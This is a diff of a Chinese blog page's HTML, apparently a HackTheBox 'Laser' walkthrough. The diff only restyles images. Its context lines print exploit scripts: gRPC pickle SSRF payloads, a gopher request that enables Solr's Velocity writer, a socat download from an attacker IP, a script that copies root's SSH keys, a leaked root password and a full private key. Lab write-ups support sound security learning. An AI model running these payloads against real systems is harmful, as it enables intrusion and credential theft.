@@ -130,7 +130,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -245,13 +245,27 @@
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 decrypt.py &gt; secwalk.pdf</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090701.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>pdf里部分有用信息：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">return service_pb2.Data(feed&#x3D;&#39;Pushing feeds&#39;) ...</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;version&quot;: &quot;v1.0&quot;,</span><br><span class="line">&quot;title&quot;: &quot;Printer Feed&quot;,</span><br><span class="line">&quot;home_page_url&quot;: &quot;http:&#x2F;&#x2F;printer.laserinternal.htb&#x2F;&quot;, &quot;feed_url&quot;: &quot;http:&#x2F;&#x2F;printer.laserinternal.htb&#x2F;feeds.json&quot;, &quot;items&quot;: [</span><br><span class="line">] &#125;</span><br></pre></td></tr></table></figure>
 
 <p>现在我们知道9000端口运行着GRPC服务</p>
 <h1 id="9000-GRPC"><a href="#9000-GRPC" class="headerlink" title="9000 GRPC"></a>9000 GRPC</h1><p>加host后，9000端口能直接访问：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090702.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据grpc文档和pdf内容，我们可以猜到后端是python grpc实现：</p>
 <ul>
 <li>Introduction to gRPC – gRPC<br><a href="https://grpc.io/docs/what-is-grpc/introduction/" target="_blank" rel="noopener">https://grpc.io/docs/what-is-grpc/introduction/</a></li>
@@ -266,14 +280,42 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install grpcio</span><br><span class="line">pip3 install grpcio-tools</span><br><span class="line">python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. miao.proto</span><br></pre></td></tr></table></figure>
 
 <p>自动生成了两个文件，miao_pb2.py和miao_pb2_grpc.py</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090703.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><p>然后我们可以使用已有文件构造grpc client,feed url使用我们的server，可以接收到请求：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090704.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090705.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="client-py"><a href="#client-py" class="headerlink" title="client.py"></a>client.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, pickle, base64</span><br><span class="line"><span class="keyword">import</span> grpc, miao_pb2, miao_pb2_grpc</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'&#123;"feed_url":"http://10.10.14.4:4444"&#125;'</span></span><br><span class="line">payload = base64.b64encode(pickle.dumps(payload))</span><br><span class="line">channel = grpc.insecure_channel(<span class="string">'10.10.10.201:9000'</span>)</span><br><span class="line">stub = miao_pb2_grpc.PrintStub(channel)</span><br><span class="line">content = miao_pb2.Content(data=payload)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = stub.Feed(content, timeout=<span class="number">10</span>)</span><br><span class="line">    print(response)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">    print(ex)</span><br></pre></td></tr></table></figure>
 
 <h1 id="本地端口扫描"><a href="#本地端口扫描" class="headerlink" title="本地端口扫描"></a>本地端口扫描</h1><p>但无法直接执行任何命令，那么可以考虑探测本地其他服务，首先扫描端口,(这一步会花费一点时间)：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090706.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090706.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>发现两个新端口，7983和8983，8983是solr默认端口</p>
 <h2 id="scanner-py"><a href="#scanner-py" class="headerlink" title="scanner.py"></a>scanner.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, pickle, base64</span><br><span class="line"><span class="keyword">import</span> grpc, miao_pb2, miao_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65536</span>):</span><br><span class="line">    payload = <span class="string">'&#123;"feed_url":"http://localhost:'</span> + str(port) + <span class="string">'"&#125;'</span></span><br><span class="line">    payload = base64.b64encode(pickle.dumps(payload))</span><br><span class="line">    channel = grpc.insecure_channel(<span class="string">'10.10.10.201:9000'</span>)</span><br><span class="line">    stub = miao_pb2_grpc.PrintStub(channel)</span><br><span class="line">    content = miao_pb2.Content(data=payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = stub.Feed(content, timeout=<span class="number">10</span>)</span><br><span class="line">        print(port, response)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Connection refused'</span> <span class="keyword">in</span> ex.details():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(port)</span><br></pre></td></tr></table></figure>
 
@@ -298,7 +340,16 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, pickle, base64</span><br><span class="line"><span class="keyword">import</span> grpc, miao_pb2, miao_pb2_grpc</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'&#123;"feed_url":"http://localhost:8983"&#125;'</span></span><br><span class="line">payload = base64.b64encode(pickle.dumps(payload))</span><br><span class="line">channel = grpc.insecure_channel(<span class="string">'10.10.10.201:9000'</span>)</span><br><span class="line">stub = miao_pb2_grpc.PrintStub(channel)</span><br><span class="line">content = miao_pb2.Content(data=payload)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = stub.Feed(content, timeout=<span class="number">10</span>)</span><br><span class="line">    print(response)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">    print(ex)</span><br></pre></td></tr></table></figure>
 
 <h2 id="reverse-shell-amp-user-flag"><a href="#reverse-shell-amp-user-flag" class="headerlink" title="reverse shell &amp; user flag"></a>reverse shell &amp; user flag</h2><p>然后就是两步exp打到reverse shel,在用户目录得到user.txtl：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090707.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090707.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">data0 = <span class="string">'&#123;"feed_url":"gopher://localhost:8983/0POST%20%2Fsolr%2Fstaging%2Fconfig%20HTTP%2F1.1%0AHost%3A%20localhost%3A8983%0AContent-Type%3A%20application%2Fjson%0AContent-Length%3A%20259%0A%0A%7B%0A%20%20%22update-queryresponsewriter%22%3A%20%7B%0A%20%20%20%20%22startup%22%3A%20%22lazy%22%2C%0A%20%20%20%20%22name%22%3A%20%22velocity%22%2C%0A%20%20%20%20%22class%22%3A%20%22solr.VelocityResponseWriter%22%2C%0A%20%20%20%20%22template.base.dir%22%3A%20%22%22%2C%0A%20%20%20%20%22solr.resource.loader.enabled%22%3A%20%22true%22%2C%0A%20%20%20%20%22params.resource.loader.enabled%22%3A%20%22true%22%0A%20%20%7D%0A%7D"&#125;'</span></span><br><span class="line"></span><br><span class="line">data = base64.b64encode(pickle.dumps(data0))</span><br><span class="line"><span class="comment"># print data</span></span><br><span class="line">os.system(<span class="string">"grpcurl -v -plaintext -d '&#123;\"data\":\"%s\"&#125;' -proto miao.proto 10.10.10.201:9000 Print.Feed"</span> %data.decode())</span><br></pre></td></tr></table></figure>
 
 <h2 id="exp2-py"><a href="#exp2-py" class="headerlink" title="exp2.py"></a>exp2.py</h2><p>服务器上nc没有-e选项的，注意自己改下payload:</p>
@@ -315,12 +366,33 @@
 <ul>
 <li>ssh - Why does sshpass still prompt for a password? - Server Fault<br><a href="https://serverfault.com/questions/934836/why-does-sshpass-still-prompt-for-a-password" target="_blank" rel="noopener">https://serverfault.com/questions/934836/why-does-sshpass-still-prompt-for-a-password</a></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090801.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090803.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2020&#x2F;09&#x2F;08 01:41:01 CMD: UID&#x3D;0    PID&#x3D;889907 | scp &#x2F;root&#x2F;clear.sh root@172.18.0.2:&#x2F;tmp&#x2F;clear.sh</span><br><span class="line">2020&#x2F;09&#x2F;08 01:29:01 CMD: UID&#x3D;0    PID&#x3D;875583 | sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@172.18.0.2 &#x2F;tmp&#x2F;clear.sh</span><br><span class="line">2020&#x2F;09&#x2F;08 01:41:01 CMD: UID&#x3D;0    PID&#x3D;889927 | ssh root@172.18.0.2 &#x2F;tmp&#x2F;clear.sh</span><br><span class="line">2020&#x2F;09&#x2F;08 01:41:01 CMD: UID&#x3D;0    PID&#x3D;889946 | ssh root@172.18.0.2 rm &#x2F;tmp&#x2F;clear.sh</span><br></pre></td></tr></table></figure>
 
 <p>可以登录进docker容器：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090802.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>根据pspy信息我们知道是宿主机root权限ssh连接到docker后执行/tmp/clear.sh，那么我们如果在docker内将ssh端口转发到宿主机，宿主机会root权限ssh连接到自身，去尝试执行/tmp/clear.sh,而我们可以控制宿主机的/tmp/clear.sh</p>
 <h2 id="tmp-clear-sh"><a href="#tmp-clear-sh" class="headerlink" title="/tmp/clear.sh"></a>/tmp/clear.sh</h2><p> 就是把root用户的ssh私钥复制出来更改权限：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo '#!/bin/sh\nmkdir -p /tmp/secwalk;cp -R /root/.ssh /tmp/secwalk; chown -R solr:solr /tmp/secwalk' &gt; /tmp/clear.sh</span><br><span class="line">chmod a+x /tmp/clear.sh</span><br></pre></td></tr></table></figure>
@@ -328,11 +400,25 @@
 <h2 id="docker-端口转发"><a href="#docker-端口转发" class="headerlink" title="docker 端口转发"></a>docker 端口转发</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.52:9999/socat</span><br><span class="line">service ssh stop</span><br><span class="line">chmod +x socat</span><br><span class="line">./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.18.0.1:22</span><br></pre></td></tr></table></figure>
 
 <h2 id="root-ssh-key"><a href="#root-ssh-key" class="headerlink" title="root ssh_key"></a>root ssh_key</h2><p>等待触发，然后我们拿到root用户的ssh key：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090804.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIG5AIBAAKCAYEAsCjrnKOm6iJddcSIyFamlV1qx6yT9X+X&#x2F;HXW7PlCGMif79md</span><br><span class="line">zutss91E+K5D&#x2F;xLe&#x2F;YpUHCcTUhfPGjBjdPmptCPaiHd30XN5FmBxmN++MAO68Hjs</span><br><span class="line">oIEgi+2tScVpokjgkF411nIS+4umg6Q+ALO3IKGortuRkOtZNdPFSv0+1Am6PdvF</span><br><span class="line">ibyGDi8ieYIK4dIZF9slEoqPlnV9lz0YWwRmSobZYQ7xX1wtmnaIrIxgHmpBYGBW</span><br><span class="line">QQ7718Kh6RNnvCh3UPEjx9GIh+2y5Jj7uxGLLDAQ3YbMKxm2ykChfI7L95kzuxQe</span><br><span class="line">mwQvIVe+R+ORLQJmBanA7AiyEyHBUYN27CF2B9wLgTj0LzHowc1xEcttbalNyL6x</span><br><span class="line">RgmXO10WJjSH1gn47VIb4X+5chbmExavRiUnfgh&#x2F;JGZ1hpBdiVwykQtvpf7f1jaM</span><br><span class="line">vy3ouV&#x2F;nVq7gdT2iz+jeQ8jZUVjNfaFKEN6nsQQ1YmPH6BUJcL7NJQGcohqn7L0P</span><br><span class="line">p6SJGiUgb9K57llzAgMBAAECggGAdxpTosZrFiZB9lv49yrO2nIcvgAK0ZOBGSo7</span><br><span class="line">NGGatNMAf9QshDhceIeEGHcKdi02I0ohcB9jSr&#x2F;aQKSyueYLPUZ4fIf5tN1T4zM1</span><br><span class="line">2tx75E7BV9EKe8KSVMlPvm8A6r5HRpTL5b+e4gAbhynG2gaoLCHgwMindMoKuQAD</span><br><span class="line">hp4OmqIxD53Fw0h5gqGPt4ObA+9fE+gQ+qZASsQJM&#x2F;YUv4UL&#x2F;BuMYbkOrSDPnH3E</span><br><span class="line">DpWiby38IcNAzh&#x2F;pWom3mrSKEIdydJ96RxaY&#x2F;3zxiCbQ974cdR1eI7V+2u&#x2F;ABvnI</span><br><span class="line">wn15cX3WDi62xoWi&#x2F;XzxsmvZxU&#x2F;PXPJoptFEVjJ5Apgjl0Fb6xveVpmGtmM2J8Tl</span><br><span class="line">BROyATejhhiFelUF16vgik+UUm3oXJtpix8HVqWg4zoYXAOTnwlJiHstavLy+zRT</span><br><span class="line">u&#x2F;3kHkNi4UgW1iYXU93gUiym2iDnMvaSc01yQPXDm8kuoHU8C&#x2F;+10ryx3ZvEuDbz</span><br><span class="line">9FmD9cB8B6rpqmoXIbItSehpushRAoHBAOP2Eg3undNkFk+fio2k3WqRz8+1gN1W</span><br><span class="line">unuL90O1noA&#x2F;CUc9t3rpcmAEwMIWGxc1btK1HkWKjUk2RNu0TPdlSiFoFTYSwBw9</span><br><span class="line">c5nGFqHV8JeSxpm7Yco9CqpLbKeg+FuchY4oym+dM6pL&#x2F;JtyhdGe3yrzo7UZoiXW</span><br><span class="line">PypKJK2URli3ZOQRpbWZivpk9r+Q09K3VbXDEo7EunKXWtS2cA2aqp2yx2oORyl&#x2F;</span><br><span class="line">SmGh028aUqYrGhWmHlFTXor9pibIwdEv1QKBwQDF08EL0UiQzGS1GFtP7tUj3AIS</span><br><span class="line">wO3YRHQJImpYPecLdMqC+FWOA0Wj5ONL7Sq9ehzaLiKXXicmKIwQlMmFmBEoyovq</span><br><span class="line">ezSkBx2iK4nwnoTQw2LJfagjyylXHGgvTBPuv&#x2F;uuuujhiX0veDo4UH6yCCyCGtnU</span><br><span class="line">eJ6bCvIpRk&#x2F;XpZySvSkt3bkpsmx0qdKsmp4MqITvuxDmHRreqcHHecW&#x2F;WKtFVE7K</span><br><span class="line">zfLBZRkbXQMS+FqXw2diae8rMgRHY&#x2F;BmSUfn0CcCgcEA10BUfflR5&#x2F;i7JIY2c1c4</span><br><span class="line">h9eVTcFKJDYvsldQrQvC1cAwB6gcJ6BlkosKZHoxLHIU6juBkRKqJHZtALQ4dOac</span><br><span class="line">3&#x2F;yDAuMjqcbQ8GPenQQBwW4jv6fzR97pwjGkMIjL2t1qMvkLZecfkO9dYH78IxqM</span><br><span class="line">CeezLl88&#x2F;9NVI56NEaZP4peRWdXcDiUk2Rka8XpUucTJ1u6TCGJ0151ZdD+sgPwJ</span><br><span class="line">nQziRZ+jzGhYmOYQWvmVDzjl0YlhWVOKk129VSP994PdAoHANFXzCmdRpU0Nj4Nk</span><br><span class="line">FN+Ab74ypjd4NPDXKdt6+uFVkIhTUxbTu4BOGi&#x2F;hmiKiXgJCQ85UxGraPJQZigFy</span><br><span class="line">1u8GCx6aqWvy3zoqss6F7axiQsCOD&#x2F;Q4WU&#x2F;UHgGb5ndgBpevw+ga2CABiF9sN53E</span><br><span class="line">BuF2tOzZmAZZH3dj3VuGn+xmYcO9cy7nX4qeera6z4MQMRUcJjf9HoOwqhuK8nTa</span><br><span class="line">xeZ1WSAWwDx&#x2F;7n4KiFyxBYHCpcfCQBz6cxkGXMSpwsW8Si2dAoHBAOEfVHHzY1NN</span><br><span class="line">9zmBThmj4+LRziBTcVxT&#x2F;KWtSaSbpmLE3gLqTqvRXSlNNM9ZFb2+TpPe1tGsINO3</span><br><span class="line">nVIoF&#x2F;A97pHpw2YRtbHFscJbhUCkP65ZOcQg+hQcBGvi9VEmfve&#x2F;OPHMiSvTSBNS</span><br><span class="line">bgJuljQ7Wp+CYpVpDpxoHgHOZCCdD+WRRlacU&#x2F;GKkex1gYuoL7iHFVQuBMD6jyjo</span><br><span class="line">1DfJUHHfYdOqwfQX2ZgUX0VPD2RvtP3Z0ta&#x2F;VJJiWtE8o8RwHgjiGw&#x3D;&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p> 之后使用这个key登录，得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090805.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/RUB-NDS/PRET" target="_blank" rel="noopener">https://github.com/RUB-NDS/PRET</a></li>
 <li>Introduction to gRPC – gRPC<br><a href="https://grpc.io/docs/what-is-grpc/introduction/" target="_blank" rel="noopener">https://grpc.io/docs/what-is-grpc/introduction/</a></li>
